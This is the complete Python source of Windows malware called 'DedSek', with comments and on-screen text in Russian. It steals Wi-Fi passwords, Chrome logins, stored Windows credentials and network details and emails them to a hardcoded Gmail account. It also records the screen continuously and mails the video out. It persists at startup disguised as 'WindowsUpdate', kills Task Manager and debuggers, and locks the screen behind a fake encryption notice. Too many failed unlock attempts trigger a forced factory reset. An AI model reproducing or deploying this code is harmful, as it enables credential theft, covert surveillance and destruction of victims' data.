import ctypes
import os
import sys
import time
import threading
import tempfile
import tkinter as tk
from tkinter import PhotoImage, scrolledtext
import shutil
import winshell
from win32com.client import Dispatch
import base64
import random
import socket
import subprocess
import json
import urllib.request
import urllib.parse
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2
import numpy as np
from PIL import ImageGrab
import sqlite3
import winreg

# ============================================================
# >>> НАСТРОЙКИ <<<
PASSWORD = "1601"
MAX_ATTEMPTS = 4
TIMER_SECONDS = 10
SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"

# Gmail
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
# ============================================================

attempts_left = MAX_ATTEMPTS

# ========== СКРЫТИЕ CMD ==========
def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

# ========== БЛОКИРОВКА WIN ==========
def disable_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def restore_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass

# ========== МЕГА-СТИЛЕР ==========
def mega_steal_data():
    try:
        full_report = []
        full_report.append("=" * 60)
        full_report.append("🔥 DedSek MEGA STEALER REPORT 🔥")
        full_report.append("=" * 60)
        
        full_report.append("\n📌 БАЗОВАЯ ИНФОРМАЦИЯ:")
        full_report.append(f"👤 Пользователь: {os.environ.get('USERNAME', 'Unknown')}")
        full_report.append(f"💻 Компьютер: {socket.gethostname()}")
        full_report.append(f"📁 Домашняя папка: {os.environ.get('USERPROFILE', 'Unknown')}")
        
        full_report.append("\n📌 IPCONFIG /ALL:")
        try:
            ipconfig = subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(ipconfig[:5000])
        except:
            full_report.append("Ошибка получения ipconfig")
        
        full_report.append("\n📌 IP АДРЕСА:")
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            full_report.append(f"Локальный IP: {local_ip}")
        except:
            pass
        
        try:
            public_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
            full_report.append(f"Внешний IP: {public_ip}")
        except:
            public_ip = "Unknown"
        
        try:
            geo = urllib.request.urlopen(f"http://ip-api.com/json/{public_ip}", timeout=5).read().decode()
            geo_json = json.loads(geo)
            full_report.append(f"Страна: {geo_json.get('country', 'Unknown')}")
            full_report.append(f"Город: {geo_json.get('city', 'Unknown')}")
            full_report.append(f"Регион: {geo_json.get('regionName', 'Unknown')}")
            full_report.append(f"Провайдер: {geo_json.get('isp', 'Unknown')}")
            full_report.append(f"ZIP: {geo_json.get('zip', 'Unknown')}")
            full_report.append(f"Lat: {geo_json.get('lat', 'Unknown')}")
            full_report.append(f"Lon: {geo_json.get('lon', 'Unknown')}")
        except:
            pass
        
        try:
            gateway = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(f"Шлюз роутера: {gateway[:500]}")
        except:
            pass
        
        full_report.append("\n📌 ARP ТАБЛИЦА:")
        try:
            arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(arp[:3000])
        except:
            pass
        
        full_report.append("\n📌 DNS КЭШ:")
        try:
            dns = subprocess.check_output("ipconfig /displaydns", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(dns[:3000])
        except:
            pass
        
        full_report.append("\n📌 АКТИВНЫЕ СОЕДИНЕНИЯ:")
        try:
            netstat = subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(netstat[:3000])
        except:
            pass
        
        full_report.append("\n📌 КЭШ ПАРОЛЕЙ WINDOWS:")
        try:
            cmdkey = subprocess.check_output("cmdkey /list", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(cmdkey[:3000])
        except:
            pass
        
        full_report.append("\n📌 ПОЛЬЗОВАТЕЛИ СИСТЕМЫ:")
        try:
            users = subprocess.check_output("net user", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(users[:1000])
        except:
            pass
        
        full_report.append("\n📌 WIFI ПАРОЛИ:")
        try:
            wifi_profiles = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            for line in wifi_profiles.split('\n'):
                if ":" in line and ("Все профили" in line or "All User" in line):
                    profile = line.split(":")[1].strip()
                    try:
                        wifi_pass = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
                        for pline in wifi_pass.split('\n'):
                            if "Ключ" in pline or "Key Content" in pline:
                                full_report.append(f"{profile}: {pline.split(':')[1].strip()}")
                    except:
                        pass
        except:
            pass
        
        full_report.append("\n📌 CHROME ПАРОЛИ:")
        try:
            chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            if os.path.exists(chrome_path):
                temp_db = os.path.join(tempfile.gettempdir(), 'chrome_temp.db')
                shutil.copy2(chrome_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall()[:20]:
                    full_report.append(f"URL: {row[0]} | Логин: {row[1]}")
                conn.close()
                try:
                    os.remove(temp_db)
                except:
                    pass
        except:
            full_report.append("Ошибка чтения Chrome")
        
        full_report.append("\n📌 СИСТЕМНАЯ ИНФОРМАЦИЯ:")
        try:
            sysinfo = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(sysinfo[:3000])
        except:
            pass
        
        full_report.append("\n📌 ЗАПУЩЕННЫЕ ПРОЦЕССЫ:")
        try:
            tasklist = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(tasklist[:3000])
        except:
            pass
        
        full_report.append("\n📌 УСТАНОВЛЕННЫЕ ПРОГРАММЫ:")
        try:
            programs = subprocess.check_output("wmic product get name,version", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            full_report.append(programs[:2000])
        except:
            pass
        
        full_report.append("\n📌 TELEGRAM:")
        try:
            tg_path = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
            if os.path.exists(tg_path):
                full_report.append("Найдена папка Telegram!")
        except:
            pass
        
        full_report.append("\n📌 DISCORD ТОКЕНЫ:")
        try:
            discord_path = os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb')
            if os.path.exists(discord_path):
                for file in os.listdir(discord_path)[:10]:
                    if file.endswith('.ldb') or file.endswith('.log'):
                        try:
                            with open(os.path.join(discord_path, file), 'r', errors='ignore') as f:
                                content = f.read()
                                if 'mfa.' in content:
                                    full_report.append(f"Токен найден в {file}!")
                        except:
                            pass
        except:
            pass
        
        full_report.append("\n" + "=" * 60)
        full_report.append(f"🕒 ОТЧЁТ СОЗДАН: {time.strftime('%d.%m.%Y %H:%M:%S')}")
        full_report.append("=" * 60)
        
        report_text = '\n'.join(full_report)
        
        max_size = 15000
        parts = [report_text[i:i+max_size] for i in range(0, len(report_text), max_size)]
        
        for i, part in enumerate(parts):
            send_email(f"Часть {i+1}/{len(parts)}:\n\n{part}", subject=f"DedSek MEGA REPORT [{i+1}/{len(parts)}]")
        
    except Exception as e:
        send_email(f"Ошибка стилера: {str(e)}")

def send_email(message, subject=None):
    try:
        if not subject:
            subject = f'DedSek Logger - {os.environ.get("USERNAME", "Unknown")} - {time.strftime("%d.%m.%Y %H:%M")}'
        
        msg = MIMEText(message, 'plain', 'utf-8')
        msg['Subject'] = subject
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        server.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        server.send_message(msg)
        server.quit()
    except:
        pass

# ========== ЗАПИСЬ ЭКРАНА ==========
def record_and_send_loop():
    while True:
        try:
            video_path = os.path.join(tempfile.gettempdir(), f"screen_{int(time.time())}.avi")
            
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(video_path, fourcc, 10.0, (1280, 720))
            
            for i in range(150):
                img = ImageGrab.grab()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                frame = cv2.resize(frame, (1280, 720))
                out.write(frame)
                time.sleep(0.1)
            
            out.release()
            send_video_email(video_path)
            
            try:
                os.remove(video_path)
            except:
                pass
            
        except:
            time.sleep(1)

def send_video_email(file_path):
    try:
        file_size = os.path.getsize(file_path)
        
        if file_size > 20 * 1024 * 1024:
            try:
                output_path = file_path.replace('.avi', '_compressed.mp4')
                command = ['ffmpeg', '-i', file_path, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', output_path]
                subprocess.run(command, capture_output=True, timeout=30)
                file_path = output_path
            except:
                pass
        
        msg = MIMEMultipart()
        msg['Subject'] = f'📹 Экран - {os.environ.get("USERNAME", "Unknown")} - {time.strftime("%d.%m.%Y %H:%M:%S")}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        
        with open(file_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="screen_{int(time.time())}.avi"')
            msg.attach(part)
        
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        server.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        server.send_message(msg)
        server.quit()
    except:
        pass

# ========== ЧАТ ==========
class VictimChat:
    def __init__(self, locker_window):
        self.locker = locker_window
        self.chat_window = None
        
    def show(self):
        self.chat_window = tk.Toplevel(self.locker.win)
        self.chat_window.geometry("400x500+50+50")
        self.chat_window.configure(bg='#00FF00')
        self.chat_window.attributes('-topmost', True)
        self.chat_window.overrideredirect(True)
        self.chat_window.focus_force()
        
        frame = tk.Frame(self.chat_window, bg='black', bd=2, relief='solid')
        frame.pack(fill='both', expand=True, padx=2, pady=2)
        
        header = tk.Frame(frame, bg='#00FF00')
        header.pack(fill='x')
        
        tk.Label(header, text="💀 DedSek Messenger 💀", 
                bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
        
        self.chat_history = scrolledtext.ScrolledText(frame, 
                                                       bg='#0a0a0a', fg='#00FF00',
                                                       font=('Courier', 10), height=22,
                                                       wrap=tk.WORD)
        self.chat_history.pack(padx=10, pady=(0, 5), fill='both', expand=True)
        self.chat_history.config(state='disabled')
        
        input_frame = tk.Frame(frame, bg='black')
        input_frame.pack(padx=10, pady=(0, 10), fill='x')
        
        self.msg_entry = tk.Entry(input_frame, bg='#0a0a0a', fg='#00FF00',
                                  font=('Courier', 10), insertbackground='#00FF00',
                                  relief='solid', bd=1)
        self.msg_entry.pack(side='left', fill='x', expand=True, ipady=3)
        self.msg_entry.bind('<Return>', self.send_message)
        
        send_btn = tk.Button(input_frame, text="▶", command=self.send_message,
                            bg='#00FF00', fg='black', font=('Courier', 10, 'bold'),
                            width=3, cursor='hand2', relief='solid', bd=1)
        send_btn.pack(side='right', padx=(5, 0))
        
        header.bind('<Button-1>', self.start_drag)
        header.bind('<B1-Motion>', self.drag)
        
        self.add_message("DedSek", "Привет! Я DedSek. Твой Windows заблокирован. Можешь писать мне сюда.")
        self.check_incoming_messages()
    
    def start_drag(self, event):
        self.x = event.x_root
        self.y = event.y_root
    
    def drag(self, event):
        deltax = event.x_root - self.x
        deltay = event.y_root - self.y
        x = self.chat_window.winfo_x() + deltax
        y = self.chat_window.winfo_y() + deltay
        self.chat_window.geometry(f"+{x}+{y}")
        self.x = event.x_root
        self.y = event.y_root
    
    def send_message(self, event=None):
        msg = self.msg_entry.get().strip()
        if msg:
            self.add_message("ТЫ", msg)
            self.msg_entry.delete(0, tk.END)
            send_email(f"💬 Сообщение от жертвы:\n\n{msg}")
    
    def add_message(self, sender, msg):
        self.chat_history.config(state='normal')
        self.chat_history.insert('end', f'[{sender}]: {msg}\n\n')
        self.chat_history.see('end')
        self.chat_history.config(state='disabled')
    
    def check_incoming_messages(self):
        def check():
            while True:
                try:
                    mail = imaplib.IMAP4_SSL('imap.gmail.com')
                    mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
                    mail.select('inbox')
                    
                    result, data = mail.search(None, 'SUBJECT "COMMAND:"', 'UNSEEN')
                    
                    if data[0]:
                        for num in data[0].split():
                            result, msg_data = mail.fetch(num, '(RFC822)')
                            msg = email.message_from_bytes(msg_data[0][1])
                            
                            if msg.is_multipart():
                                for part in msg.walk():
                                    if part.get_content_type() == "text/plain":
                                        command = part.get_payload(decode=True).decode()
                                        if command.startswith("MSG:"):
                                            self.chat_window.after(0, self.add_message, "DedSek", command[4:])
                                        
                            mail.store(num, '+FLAGS', '\\Seen')
                    
                    mail.close()
                    mail.logout()
                except:
                    pass
                time.sleep(5)
        
        threading.Thread(target=check, daemon=True).start()

# ========== АНТИ-ОТЛАДКА ==========
def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
        suspicious = ["wireshark.exe", "procmon.exe", "processhacker.exe", 
                     "taskmgr.exe", "regedit.exe", "msconfig.exe"]
        for proc in suspicious:
            os.system(f"taskkill /f /im {proc} >nul 2>&1")
    except:
        pass

# ========== АВТОЗАГРУЗКА ==========
def add_to_startup():
    try:
        current_path = os.path.abspath(__file__)
        pyw_path = os.path.splitext(current_path)[0] + ".pyw"
        if not current_path.endswith(".pyw"):
            try:
                shutil.copy2(current_path, pyw_path)
            except:
                pass
            current_path = pyw_path
        
        startup_folder = winshell.startup()
        shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
        shortcut.Arguments = '"' + current_path + '"'
        shortcut.WorkingDirectory = os.path.dirname(current_path)
        shortcut.IconLocation = "shell32.dll,13"
        shortcut.save()
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, 
                            f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{current_path}"')
            winreg.CloseKey(key)
        except:
            pass
    except:
        pass

# ========== БЛОКИРОВКА ВВОДА ==========
def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
    except:
        pass

# ========== БЛОКИРОВКА ВСЕХ КЛАВИШ ==========
def block_all_keys():
    try:
        import keyboard
        all_combos = [
            'alt+f4', 'alt+tab', 'alt+esc', 'alt+space',
            'ctrl+shift+esc', 'ctrl+alt+del', 'ctrl+esc',
            'ctrl+w', 'ctrl+f4', 'ctrl+tab',
            'win', 'win+d', 'win+r', 'win+e', 'win+l',
            'win+m', 'win+tab', 'win+x', 'win+u',
            'alt', 'ctrl', 'shift', 'f11',
            'print screen', 'alt+print screen',
            'left windows', 'right windows'
        ]
        for combo in all_combos:
            try:
                keyboard.add_hotkey(combo, lambda: None, suppress=True, timeout=0)
            except:
                pass
        
        try:
            keyboard.block_key('windows')
            keyboard.block_key('left windows')
            keyboard.block_key('right windows')
        except:
            pass
        
        block_keys = ['f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
                     'print screen','scroll lock','pause']
        for key in block_keys:
            try:
                keyboard.block_key(key)
            except:
                pass
    except:
        pass

# ========== УБИЙЦА ПРОЦЕССОВ ==========
def kill_processes():
    kill_list = [
        "taskmgr.exe", "cmd.exe", "powershell.exe", "msconfig.exe",
        "regedit.exe", "procexp.exe", "procmon.exe", "processhacker.exe",
        "wireshark.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe"
    ]
    while True:
        try:
            for proc in kill_list:
                os.system(f"taskkill /f /im {proc} >nul 2>&1")
        except:
            pass
        time.sleep(0.05)

# ========== ЗАЩИТА ОТ ВЫКЛЮЧЕНИЯ ==========
def prevent_shutdown():
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(
            ctypes.windll.kernel32.GetConsoleWindow(), 
            "Windows Update in progress..."
        )
    except:
        pass

# ========== ПОЛНЫЙ СБРОС WINDOWS ==========
def full_windows_reset():
    try:
        restore_win_key()
        
        error_screen = tk.Tk()
        error_screen.attributes('-fullscreen', True)
        error_screen.attributes('-topmost', True)
        error_screen.configure(bg='black')
        error_screen.overrideredirect(True)
        error_screen.focus_force()
        error_screen.grab_set()
        
        lbl = tk.Label(error_screen, text="404 | WINDOWS ERROR", 
                       bg='black', fg='#FF0000',
                       font=('Courier', 40, 'bold'))
        lbl.pack(expand=True)
        
        sub_lbl = tk.Label(error_screen, text="CRITICAL SYSTEM FAILURE\n\nALL DATA WILL BE ERASED...", 
                           bg='black', fg='#FF0000',
                           font=('Courier', 20))
        sub_lbl.pack()
        
        error_screen.update()
        time.sleep(5)
        error_screen.destroy()
        
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        os.system("taskkill /f /im winlogon.exe >nul 2>&1")
        os.system("systemreset -factoryreset")
        time.sleep(3)
        os.system("shutdown /r /t 0 /f")
        os._exit(0)
    except:
        os.system("shutdown /r /t 0 /f")
        os._exit(0)

# ========== АНИМАЦИЯ ЗАГРУЗКИ ==========
def boot_animation():
    anim = tk.Tk()
    anim.attributes('-fullscreen', True)
    anim.attributes('-topmost', True)
    anim.configure(bg='black')
    anim.overrideredirect(True)
    anim.focus_force()
    anim.grab_set()
    
    disable_win_key()
    
    lbl = tk.Label(anim, text="", bg='black', fg='white',
                   font=('Courier', 20, 'bold'))
    lbl.pack(expand=True)
    
    for i in range(8):
        if i % 2 == 0:
            anim.configure(bg='white')
            lbl.config(bg='white', fg='black')
        else:
            anim.configure(bg='black')
            lbl.config(bg='black', fg='white')
        anim.update()
        time.sleep(0.2)
    
    anim.configure(bg='black')
    lbl.config(bg='black', fg='#00FF00')
    anim.attributes('-alpha', 0.0)
    
    for alpha in range(0, 110, 5):
        anim.attributes('-alpha', alpha/100)
        lbl.config(text="DedSek тебя взломали")
        anim.update()
        time.sleep(0.03)
    
    anim.attributes('-alpha', 1.0)
    time.sleep(1.5)
    
    progress = [
        "Идет шифровка данных...",
        "[                    ] 0%",
        "[##                  ] 10%",
        "[####                ] 20%",
        "[######              ] 30%",
        "[########            ] 40%",
        "[##########          ] 50%",
        "[############        ] 60%",
        "[##############      ] 70%",
        "[################    ] 80%",
        "[##################  ] 90%",
        "[####################] 100%",
        "",
        "ДАННЫЕ УСПЕШНО ЗАШИФРОВАНЫ!"
    ]
    
    for msg in progress:
        lbl.config(text=msg)
        anim.update()
        time.sleep(0.25)
    
    time.sleep(1)
    anim.destroy()

# ========== ОСНОВНОЙ ЭКРАН ==========
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.focus_force()
        self.win.grab_set()
        
        global attempts_left
        
        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f:
                f.write(img_data)
            skull_img = PhotoImage(file=img_path)
            lbl_img = tk.Label(self.win, image=skull_img, bg='black')
            lbl_img.image = skull_img
            lbl_img.place(relx=0.5, rely=0.05, anchor='center')
        except:
            pass
        
        msg = f"""ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!

ТЫ ДУМАЕШЬ ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ!

1. standard DES
$1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/

2. Bcrypt
$2y$10$/yFT/ZN1yJkgm4.8pSzTPOkhhEXOJC3H.gbs09EvKawKS3zz8Wf4e

3. Base64
MTI0Njk4ODA0

4. standard DES
$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1

5. uuEncode
+.3@P-C

УДАЧИ, ДРУГ. У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ!"""
        
        lbl_msg = tk.Label(self.win, text=msg, bg='black', fg='#00FF00',
                           font=('Courier', 9, 'bold'), justify='left')
        lbl_msg.place(relx=0.5, rely=0.42, anchor='center')
        
        self.chat = VictimChat(self)
        self.win.after(500, self.chat.show)
        
        center_frame = tk.Frame(self.win, bg='black')
        center_frame.place(relx=0.5, rely=0.82, anchor='center')
        
        tk.Label(center_frame, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00',
                 font=('Courier', 14, 'bold')).pack(pady=(0, 5))
        
        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 14, 'bold'),
                              bg='black', fg='#00FF00', insertbackground='#00FF00',
                              relief='solid', bd=2)
        self.entry.pack(pady=(0, 5), ipadx=40, ipady=3)
        
        self.status = tk.Label(center_frame, text=f"ОСТАЛОСЬ ПОПЫТОК: {attempts_left}",
                               bg='black', fg='#FF0000',
                               font=('Courier', 12, 'bold'))
        self.status.pack()
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_force()
        self.win.after(100, self.keep_focus)
    
    def keep_focus(self):
        try:
            self.win.focus_force()
            self.entry.focus_force()
            self.win.after(100, self.keep_focus)
        except:
            pass
    
    def check_password(self, event=None):
        global attempts_left
        
        if self.entry.get() == PASSWORD:
            restore_win_key()
            self.status.config(text="ВЕРНО! РАЗБЛОКИРОВКА...", fg='#00FF00')
            self.win.update()
            time.sleep(1)
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.status.config(text=f"НЕВЕРНО! ОСТАЛОСЬ ПОПЫТОК: {attempts_left}",
                                  fg='#FF0000')
            else:
                self.status.config(text="404 | WINDOWS ERROR", fg='#FF0000')
                self.win.update()
                time.sleep(2)
                self.root.destroy()
                full_windows_reset()
            self.entry.delete(0, tk.END)

# ========== ТОЧКА ВХОДА ==========
if __name__ == "__main__":
    # Скрываем консоль сразу
    hide_console()
    
    anti_debug()
    
    # Блокируем Win сразу
    disable_win_key()
    
    # Мега-стилер
    threading.Thread(target=mega_steal_data, daemon=True).start()
    
    # Запись экрана
    threading.Thread(target=record_and_send_loop, daemon=True).start()
    
    add_to_startup()
    
    # Таймер 10 секунд
    time.sleep(TIMER_SECONDS)
    
    boot_animation()
    block_input(True)
    prevent_shutdown()
    
    threading.Thread(target=kill_processes, daemon=True).start()
    threading.Thread(target=block_all_keys, daemon=True).start()
    
    WinLocker()
    tk.mainloop()
